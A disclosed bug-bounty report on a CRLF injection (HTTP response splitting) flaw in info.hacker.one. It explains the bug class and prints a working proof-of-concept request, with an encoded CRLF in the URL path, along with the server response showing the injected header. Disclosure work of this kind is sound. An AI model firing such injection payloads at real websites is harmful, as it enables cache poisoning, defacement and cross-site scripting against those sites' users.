# CRLF injection in info.hacker.one

## Report Details
- **Report ID**: 217058
- **URL**: https://hackerone.com/reports/217058
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-29T18:19:16.560Z
- **Disclosed**: 2017-05-03T17:06:18.996Z

## Reporter
- **Username**: thalaivarsubu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Vulnerable URL:
info.hacker.one

Vulnerability description
This script is possibly vulnerable to CRLF injection attacks. 

HTTP headers have the structure "Key: Value", where each line is separated by the CRLF combination. If the user input is injected into the value section without properly escaping/removing CRLF characters it is possible to alter the HTTP headers structure.
HTTP Response Splitting is a new application attack technique which enables various new attacks such as web cache poisoning, cross user defacement, hijacking pages with sensitive user information and cross-site scripting (XSS). The attacker sends a single HTTP request that forces the web server to form an output stream, which is then interpreted by the target as two HTTP responses instead of one response.


URI was set to headername: headervalue
Injected header found: 

headername: headervalue


Request
GET /%0d%0a%09headername:%20headervalue HTTP/1.1
Host: info.hacker.one
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

Response
HTTP/1.1 301 Moved Permanently
Date: Wed, 29 Mar 2017 18:11:47 GMT
Location: http://info.hacker.one/
headername: headervalue/
P3P: CP="This is not a privacy policy."
X-Powered-By: Page Server II 2.1.117 bab5965
X-Server-Instance: ps2-07ebf0a99d.ap-southeast-1.unbounce.net
Content-Length: 0
Connection: keep-alive




## Attachments
No attachments
